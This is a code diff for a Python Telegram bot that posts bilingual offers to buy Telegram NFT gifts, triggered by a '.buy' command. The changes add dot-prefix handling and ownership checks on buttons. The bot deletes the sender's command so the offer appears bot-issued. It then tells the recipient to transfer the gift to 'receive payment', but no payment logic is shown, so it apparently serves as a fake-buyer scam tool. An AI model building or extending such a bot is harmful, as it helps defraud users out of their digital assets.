@@ -21,10 +21,10 @@ active_deals = {}
 TEXTS = {
     "ru": {
         "usage": (
-            "⚠️ Использование: `/buy <ссылка_на_NFT> <сумма> <валюта> [eu]`\n"
-            "Пример: `/buy https://t.me/nft/SnoopDogg-9203 1000 STARS`\n"
+            "⚠️ Использование: `.buy <ссылка_на_NFT> <сумма> <валюта> [eu]`\n"
+            "Пример: `.buy https://t.me/nft/SnoopDogg-9203 1000 STARS`\n"
             "Для английского добавьте `eu` в конце: "
-            "`/buy https://t.me/nft/SnoopDogg-9203 1000 STARS eu`"
+            "`.buy https://t.me/nft/SnoopDogg-9203 1000 STARS eu`"
         ),
         "invalid_link": (
             "⚠️ Неверная ссылка на NFT.\n"
@@ -38,6 +38,7 @@ TEXTS = {
         "decline_btn": "❌ Отклонить",
         "accept_btn": "✅ Принять",
         "declined": "❌ Предложение отклонено",
+        "not_yours": "⚠️ Эта сделка не для вас.",
         "alert_title": (
             "Внимание!\n\n"
             "Следуйте инструкции, чтобы не потерять подарок и получить оплату.\n\n"
@@ -68,10 +69,10 @@ TEXTS = {
     },
     "en": {
         "usage": (
-            "⚠️ Usage: `/buy <NFT_link> <amount> <currency> [eu]`\n"
-            "Example: `/buy https://t.me/nft/SnoopDogg-9203 1000 STARS`\n"
+            "⚠️ Usage: `.buy <NFT_link> <amount> <currency> [eu]`\n"
+            "Example: `.buy https://t.me/nft/SnoopDogg-9203 1000 STARS`\n"
             "For English add `eu` at the end: "
-            "`/buy https://t.me/nft/SnoopDogg-9203 1000 STARS eu`"
+            "`.buy https://t.me/nft/SnoopDogg-9203 1000 STARS eu`"
         ),
         "invalid_link": (
             "⚠️ Invalid NFT link.\n"
@@ -85,6 +86,7 @@ TEXTS = {
         "decline_btn": "❌ Decline",
         "accept_btn": "✅ Accept",
         "declined": "❌ Offer declined",
+        "not_yours": "⚠️ This deal is not for you.",
         "alert_title": (
             "Attention!\n\n"
             "Follow the instructions to not lose the gift and receive payment.\n\n"
@@ -122,8 +124,8 @@ def parse_nft_link(url):
     if not match:
         return None
 
-    name = match.group(1)     # "SnoopDogg"
-    number = match.group(2)   # "9203"
+    name = match.group(1)
+    number = match.group(2)
 
     return {
         "name": name,
@@ -133,10 +135,9 @@ def parse_nft_link(url):
     }
 
 
-# --- Команда /buy ---
-@dp.message(Command("buy"))
-async def cmd_buy(message: types.Message):
-    # Удаляем сообщение пользователя
+# --- Основная логика команды .buy / /buy ---
+async def process_buy(message: types.Message):
+    # Удаляем сообщение пользователя (если можем)
     try:
         await message.delete()
     except Exception as e:
@@ -144,13 +145,13 @@ async def cmd_buy(message: types.Message):
 
     args = message.text.split()
 
-    # Определяем язык: если последний аргумент = "eu" — английский
+    # Определяем язык
     lang = "ru"
     if len(args) >= 2 and args[-1].lower() == "eu":
         lang = "en"
-        args = args[:-1]  # убираем "eu" из аргументов
+        args = args[:-1]
 
-    t = TEXTS[lang]  # тексты на нужном языке
+    t = TEXTS[lang]
 
     if len(args) < 4:
         await message.answer(t["usage"])
@@ -166,9 +167,8 @@ async def cmd_buy(message: types.Message):
         await message.answer(t["invalid_link"])
         return
 
-    nft_title = nft_data["full"]   # "SnoopDogg #9203"
+    nft_title = nft_data["full"]
 
-    # Текст предложения (ссылка голая — чтобы Telegram показал виджет)
     text = (
         f"<b>{t['header']}</b>\n"
         f"<b>{nft_title}</b>\n\n"
@@ -177,19 +177,28 @@ async def cmd_buy(message: types.Message):
         f"{t['valid_for']}"
     )
 
+    deal_id = f"{message.chat.id}_{message.from_user.id}"
+
     builder = InlineKeyboardBuilder()
     builder.row(
-        InlineKeyboardButton(text=t["decline_btn"], callback_data=f"decline_{message.from_user.id}_{lang}"),
-        InlineKeyboardButton(text=t["accept_btn"], callback_data=f"accept_{message.from_user.id}_{lang}")
+        InlineKeyboardButton(
+            text=t["decline_btn"],
+            callback_data=f"decline_{message.chat.id}_{message.from_user.id}_{lang}"
+        ),
+        InlineKeyboardButton(
+            text=t["accept_btn"],
+            callback_data=f"accept_{message.chat.id}_{message.from_user.id}_{lang}"
+        )
     )
 
-    deal_id = str(message.from_user.id)
     active_deals[deal_id] = {
         "link": nft_link,
         "amount": amount,
         "currency": currency,
         "title": nft_title,
-        "lang": lang
+        "lang": lang,
+        "user_id": message.from_user.id,
+        "chat_id": message.chat.id
     }
 
     await message.answer(
@@ -200,13 +209,25 @@ async def cmd_buy(message: types.Message):
     )
 
 
+# --- Обработчики: и /buy, и .buy ---
+@dp.message(Command("buy"))
+@dp.message(F.text.startswith(".buy"))
+async def cmd_buy_handler(message: types.Message):
+    await process_buy(message)
+
+
 # --- Отклонить ---
 @dp.callback_query(F.data.startswith("decline_"))
 async def process_decline(callback: CallbackQuery):
-    # Достаём язык из callback_data: decline_<user_id>_<lang>
+    # decline_<chat_id>_<user_id>_<lang>
     parts = callback.data.split("_")
     lang = parts[-1] if parts[-1] in TEXTS else "ru"
     t = TEXTS[lang]
+
+    deal_user_id = parts[-2]
+    if str(callback.from_user.id) != deal_user_id:
+        await callback.answer(t["not_yours"], show_alert=True)
+        return
 
     await callback.message.edit_text(t["declined"])
     await callback.answer()
@@ -215,14 +236,22 @@ async def process_decline(callback: CallbackQuery):
 # --- Принять ---
 @dp.callback_query(F.data.startswith("accept_"))
 async def process_accept(callback: CallbackQuery):
+    # accept_<chat_id>_<user_id>_<lang>
     parts = callback.data.split("_")
     lang = parts[-1] if parts[-1] in TEXTS else "ru"
     t = TEXTS[lang]
 
+    deal_user_id = parts[-2]
+    deal_chat_id = parts[-3]
+
+    if str(callback.from_user.id) != deal_user_id:
+        await callback.answer(t["not_yours"], show_alert=True)
+        return
+
     await callback.answer(text=t["alert_title"], show_alert=True)
     await asyncio.sleep(1.5)
 
-    deal_id = parts[1]  # user_id
+    deal_id = f"{deal_chat_id}_{deal_user_id}"
     deal = active_deals.get(deal_id)
     if not deal:
         await callback.message.edit_text(t["deal_lost"])
@@ -250,7 +279,10 @@ async def process_accept(callback: CallbackQuery):
         InlineKeyboardButton(text=t["transfer_btn"], url=nft_url)
     )
     builder.row(
-        InlineKeyboardButton(text=t["confirm_btn"], callback_data=f"confirm_{deal_id}_{lang}")
+        InlineKeyboardButton(
+            text=t["confirm_btn"],
+            callback_data=f"confirm_{deal_chat_id}_{deal_user_id}_{lang}"
+        )
     )
 
     await callback.message.edit_text(
@@ -264,9 +296,15 @@ async def process_accept(callback: CallbackQuery):
 # --- Подтвердить передачу ---
 @dp.callback_query(F.data.startswith("confirm_"))
 async def process_confirm(callback: CallbackQuery):
+    # confirm_<chat_id>_<user_id>_<lang>
     parts = callback.data.split("_")
     lang = parts[-1] if parts[-1] in TEXTS else "ru"
     t = TEXTS[lang]
+
+    deal_user_id = parts[-2]
+    if str(callback.from_user.id) != deal_user_id:
+        await callback.answer(t["not_yours"], show_alert=True)
+        return
 
     await callback.answer(t["confirmed"], show_alert=True)
     await callback.message.edit_text(t["deal_done"])
